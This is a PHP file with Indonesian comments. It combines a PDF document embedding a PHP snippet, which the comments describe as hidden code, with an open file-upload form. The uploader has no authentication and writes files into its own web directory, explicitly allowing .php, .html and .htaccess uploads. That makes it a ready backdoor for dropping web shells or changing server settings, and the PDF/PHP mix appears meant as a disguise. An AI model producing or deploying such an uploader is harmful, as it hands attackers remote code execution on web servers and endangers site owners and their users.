<?php
// Buat file PDF dengan kode PHP yang terselip
$pdf_content = <<<PDF
%PDF-1.4
1 0 obj
<<
  /Type /Catalog
  /Pages 2 0 R
>>
endobj
2 0 obj
<<
  /Type /Pages
  /Kids [3 0 R]
  /Count 1
>>
endobj
3 0 obj
<<
  /Type /Page
  /Parent 2 0 R
  /MediaBox [0 0 612 792]
  /Contents 4 0 R
>>
endobj
4 0 obj
<<
  /Length 89
>>
stream
BT
/F1 24 Tf
100 700 Td
(Hello World!) Tj
100 650 Td
(This is a PHP code snippet:) Tj
100 600 Td
(<?php echo "Hello, PHP in PDF!"; ?>) Tj
ET
endstream
endobj
5 0 obj
<<
  /Type /Font
  /Subtype /Type1
  /BaseFont /Helvetica
>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000067 00000 n
0000000112 00000 n
0000000213 00000 n
0000000342 00000 n
trailer
<<
  /Size 6
  /Root 1 0 R
>>
startxref
385
%%EOF
PDF;
?>
<?php
// Cek apakah form telah disubmit
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Direktori tujuan adalah lokasi file uploader ini
    $targetDir = ""; // Kosongkan untuk menyimpan file di lokasi saat ini
    
    // Ambil informasi file yang diunggah
    $fileName = basename($_FILES['fileToUpload']['name']);
    $targetFilePath = $targetDir . $fileName;
    
    // Validasi file (opsional, pastikan ini disesuaikan sesuai kebutuhan)
    $fileType = pathinfo($targetFilePath, PATHINFO_EXTENSION);
    
    // Hanya izinkan file tertentu (tambahkan jenis file lain jika diperlukan)
    $allowedTypes = ['php', 'html', 'htaccess', 'txt', 'png', 'zip'];
    if (in_array(strtolower($fileType), $allowedTypes)) {
        // Coba unggah file
        if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $targetFilePath)) {
            echo "File berhasil diunggah: " . htmlspecialchars($fileName);
        } else {
            echo "Terjadi kesalahan saat mengunggah file.";
        }
    } else {
        echo "Tipe file tidak diizinkan.";
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uploader File</title>
</head>
<body>
    <h2>Form Unggah File</h2>
    <form action="" method="post" enctype="multipart/form-data">
        <label for="fileToUpload">Pilih file untuk diunggah:</label>
        <input type="file" name="fileToUpload" id="fileToUpload" required>
        <button type="submit">Unggah File</button>
    </form>
</body>
</html>
